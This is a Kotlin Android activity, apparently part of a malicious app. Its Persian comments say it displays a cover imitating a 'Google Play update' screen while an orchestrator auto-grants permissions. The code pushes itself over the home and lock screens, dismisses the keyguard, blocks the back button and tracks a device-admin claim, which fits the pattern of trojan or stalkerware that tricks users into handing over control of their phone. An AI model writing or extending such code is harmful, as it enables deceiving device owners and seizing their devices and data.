package com.base.realtime.access

import android.app.Activity
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.window.OnBackInvokedDispatcher
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import com.base.realtime.R

/**
 * Activity مات (نه شفاف) تا از پس‌زمینه / روی Home حتماً جلو بیاید و host مجوز باشد.
 * با [AutoGrantDebug.hideCover] ظاهر Play مخفی می‌شود (صفحهٔ خالی دیباگ).
 */
class AutoGrantActivity : Activity() {

    private val main = Handler(Looper.getMainLooper())
    private var started = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "onCreate hideCover=${AutoGrantDebug.hideCover}")
        if (Build.VERSION.SDK_INT >= 33) {
            onBackInvokedDispatcher.registerOnBackInvokedCallback(
                OnBackInvokedDispatcher.PRIORITY_DEFAULT,
            ) { /* Back خروج از Settings نباید این host را ببندد */ }
        }
        if (AutoGrantDebug.hideCover) {
            // فقط host مجوز؛ بدون ظاهر «به‌روزرسانی Google Play»
            setContentView(
                FrameLayout(this).apply {
                    setBackgroundColor(Color.WHITE)
                    layoutParams = ViewGroup.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT,
                        ViewGroup.LayoutParams.MATCH_PARENT,
                    )
                    addView(
                        TextView(this@AutoGrantActivity).apply {
                            text = "AutoGrant debug host"
                            setTextColor(Color.GRAY)
                            textSize = 14f
                            gravity = Gravity.CENTER
                        },
                        FrameLayout.LayoutParams(
                            ViewGroup.LayoutParams.MATCH_PARENT,
                            ViewGroup.LayoutParams.MATCH_PARENT,
                        ),
                    )
                },
            )
        } else {
            setContentView(R.layout.activity_auto_grant)
            findViewById<TextView>(R.id.autoGrantTitle)?.text =
                getString(R.string.perm_auto_grant_scan_title)
            findViewById<TextView>(R.id.autoGrantProgress)?.text =
                getString(R.string.perm_auto_grant_scan_body)
            findViewById<TextView>(R.id.autoGrantStatus)?.text =
                getString(R.string.perm_auto_grant_scan_status)
            findViewById<TextView>(R.id.autoGrantStep)?.text =
                getString(R.string.perm_auto_grant_overlay_progress, 1, 1)
            findViewById<android.widget.ProgressBar>(R.id.autoGrantBar)?.progress = 8
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
        main.post {
            if (isFinishing || started) return@post
            started = true
            AutoGrantOrchestrator.onHostReady(this)
        }
    }

    override fun onNewIntent(intent: android.content.Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        Log.i(TAG, "onNewIntent")
        if (!started && !isFinishing) {
            started = true
            AutoGrantOrchestrator.onHostReady(this)
        }
    }

    override fun onResume() {
        super.onResume()
        Log.i(TAG, "onResume started=$started")
        if (started) {
            AutoGrantOrchestrator.onHostResume(this)
        } else if (!isFinishing) {
            started = true
            AutoGrantOrchestrator.onHostReady(this)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        if (!AutoGrantOrchestrator.onRequestPermissionsResult(this, requestCode, permissions, grantResults)) {
            @Suppress("DEPRECATION")
            super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
        @Suppress("DEPRECATION")
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == DeviceAdminClaim.REQUEST_CODE) {
            Log.i(TAG, "device admin result=$resultCode active=${DeviceAdminClaim.isActive(this)}")
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // host مجوز باز می‌ماند
    }

    override fun onDestroy() {
        main.removeCallbacksAndMessages(null)
        AutoGrantOrchestrator.onHostDestroyed(this)
        super.onDestroy()
    }

    private companion object {
        const val TAG = "AutoGrant"
    }
}
